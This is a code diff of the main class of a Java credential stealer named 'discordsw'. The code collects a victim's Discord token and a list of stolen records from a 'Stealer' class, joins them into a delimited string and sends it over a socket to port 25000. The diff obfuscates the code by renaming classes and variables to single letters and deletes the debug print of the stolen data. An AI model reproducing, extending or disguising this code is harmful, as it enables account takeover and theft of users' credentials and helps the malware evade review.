@@ -1,44 +1,42 @@
 package me.mafrans.discordsw;
 
-import me.mafrans.discordsw.stealer.Data;
-import me.mafrans.discordsw.stealer.Stealer;
+import me.mafrans.discordsw.stealer.A;
+import me.mafrans.discordsw.stealer.B;
 
 import java.io.*;
-import java.net.InetAddress;
 import java.net.Socket;
 import java.util.List;
 
 public class Main {
-    private static Socket socket;
-    public static SQLiteManager sql;
+    private static Socket a;
+    public static D b;
 
-    public static void main(String[] b) {
+    public static void main(String[] args) {
         try {
-            String host = "localhost";
-            int port = 25000;
-            socket = new Socket(host, port);
+            String c = "localhost";
+            int d = 25000;
+            a = new Socket(c, d);
 
-            OutputStream os = socket.getOutputStream();
-            OutputStreamWriter osw = new OutputStreamWriter(os);
-            BufferedWriter bw = new BufferedWriter(osw);
+            OutputStream e = a.getOutputStream();
+            OutputStreamWriter f = new OutputStreamWriter(e);
+            BufferedWriter g = new BufferedWriter(f);
 
-            sql = new SQLiteManager();
-            sql.initialize();
+            b = new D();
+            b.initialize();
 
-            List<Data> dataList = Stealer.s();
+            List<A> h = B.s();
 
-            StringBuilder builder = new StringBuilder();
-            builder.append(sql.n + Discord.getToken().replace(" ", "") + "||||||");
-            for(Data data : dataList) {
-                builder.append(data.x + ":||");
-                builder.append(sql.o + data.y + "||");
-                builder.append(sql.p + data.z + "||||");
+            StringBuilder i = new StringBuilder();
+            i.append(b.n + C.c().replace(" ", "") + "||||||");
+            for(A j : h) {
+                i.append(j.x + ":||");
+                i.append(b.o + j.y + "||");
+                i.append(b.p + j.z + "||||");
             }
 
-            bw.write(builder.toString());
-            System.out.println(builder.toString());
-            bw.flush();
-            socket.close();
+            g.write(i.toString());
+            g.flush();
+            a.close();
         }
         catch (Exception e) {
             e.printStackTrace();
